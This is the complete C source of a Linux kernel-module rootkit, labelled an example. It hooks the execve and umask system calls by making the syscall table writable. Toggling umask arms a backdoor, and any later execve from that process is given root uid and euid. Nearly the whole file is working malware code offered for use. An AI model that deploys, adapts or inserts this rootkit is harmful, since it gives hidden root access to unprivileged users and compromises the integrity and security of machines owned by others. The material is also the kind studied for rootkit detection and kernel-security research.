/* An example rootkit that gives root permissions to a userland process */

#include <asm/unistd.h>
#include <asm/cacheflush.h>
#include <asm/pgtable_types.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/fs.h>
#include <linux/sched.h>
#include <linux/kallsyms.h>
#include <linux/cred.h>

#define MA "@Pink_P4nther"
#define MD "Example Rootkit"
#define ML "GPL"
#define MV "1.1"

/* Enable root escalation flag */
int ref = 0;

/* Syscall table address */
void **sct_address;

/* Set sys_call_table address to sct_address */
void set_sct_addr(void);

/* Execve syscall hook */
asmlinkage int (*origin_execvecall) (const char *filename, const char *const argv[], const char *const envp[]);

/* Mal execve hook syscall */
asmlinkage int mal_execve(const char *filename, const char *const argv[], const char *const envp[])
{
	if (ref == 1){
		printk(KERN_INFO "[+] Giving r00t!");
		
		/* Create process cred struct */
		struct cred *np;
		/* Create uid struct */
		kuid_t nuid;
		/* Set uid struct value to 0 */
		nuid.val = 0;
		
		/* Prepares new set of credentials for task_struct of current process */
		np = prepare_creds();
		/* Set uid of new cred struct to 0 */
		np->uid = nuid;
		/* Set euid of new cred struct to 0 */
		np->euid = nuid;
		/* Commit cred to task_struct of process */
		commit_creds(np);
	}
	/* Call original execve syscall */
	return origin_execvecall(filename,argv,envp);
}

/* Umask syscall hook */
asmlinkage int (*origin_umaskcall) (mode_t mask);

/* Mal umask hook syscall */
asmlinkage int mal_umask(mode_t mask){
	if (ref == 0){
		/* Set enable root escalation flag */
		ref = 1;
	} else{
		/* Unset enable root escalation flag */
		ref = 0;
	}
	/* Call original umask syscall */
	return origin_umaskcall(mask);
}

/* Set SCT Address */
void set_sct_addr(void)
{
	/* Lookup address for sys_call_table and set sct_address to it */
	sct_address = (void*)kallsyms_lookup_name("sys_call_table");
}

/* Make SCT writeable */
int sct_w(unsigned long sct_addr)
{
	unsigned int level;
	pte_t *pte = lookup_address(sct_addr,&level);
	if (pte->pte &~_PAGE_RW)
	{
		pte->pte |=_PAGE_RW;
	}
	return 0;
}

/* Make SCT write protected */
int sct_xw(unsigned long sct_addr)
{
	unsigned int level;
	pte_t *pte = lookup_address(sct_addr, &level);
	pte->pte = pte->pte &~_PAGE_RW;
	return 0;
}

/* Loads LKM */
static int __init hload(void)
{
	/* Set syscall table address */
	set_sct_addr();
	/* Set pointer to original syscalls */
	origin_execvecall = sct_address[__NR_execve];
	origin_umaskcall = sct_address[__NR_umask];
	/* Make SCT writeable */
	sct_w((unsigned long)sct_address);

	/* Hook execve and umask syscalls */
	sct_address[__NR_execve] = mal_execve;
	sct_address[__NR_umask] = mal_umask;
	/* Set SCT write protected */
	sct_xw((unsigned long)sct_address);

	printk(KERN_INFO "[?] SCT: [0x%llx]\n[?] EXECVE: [0x%llx]\n[?] UMASK: [0x%llx]",sct_address,sct_address[__NR_execve],sct_address[__NR_umask]);

	return 0;
}

/* Unloads LKM */
static void __exit hunload(void)
{
	/* Rewrite the original syscall addresses back into the SCT page */
	sct_w((unsigned long )sct_address);
	sct_address[__NR_execve] = origin_execvecall;
	sct_address[__NR_umask] = origin_umaskcall;

	/* Make SCT page write protected */
	sct_xw((unsigned long)sct_address);
}

module_init(hload);
module_exit(hunload);

MODULE_LICENSE(ML);
MODULE_AUTHOR(MA);
MODULE_DESCRIPTION(MD);
MODULE_VERSION(MV);
